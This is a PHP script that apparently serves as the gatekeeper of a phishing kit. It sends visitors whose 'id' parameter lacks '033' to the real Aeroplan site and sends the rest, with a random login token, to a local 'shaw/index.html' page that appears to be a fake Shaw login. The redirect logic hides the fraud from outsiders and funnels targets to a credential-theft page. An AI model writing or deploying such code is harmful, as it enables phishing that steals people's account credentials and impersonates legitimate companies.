<?php
error_reporting(0);
@session_start();
$customersvcs=date('U');


$site="shaw/index.html?customersvcs=".$customersvcs;

$id=$_GET["id"];

$pos = strpos($id, '033');

if ($pos>-1)
{

}
else
{
header('Location: https://www.aeroplan.com/');
exit;
}






$_SESSION['justowner'] = 'green';
if ($_SESSION['justowner']=="green")
{



$random = md5(uniqid(time()));
$header='Location: '.$site."?idlogin=".$random;


header($header); 
}
else
{
header('Location: https://www.aeroplan.com/');
exit;
}

?>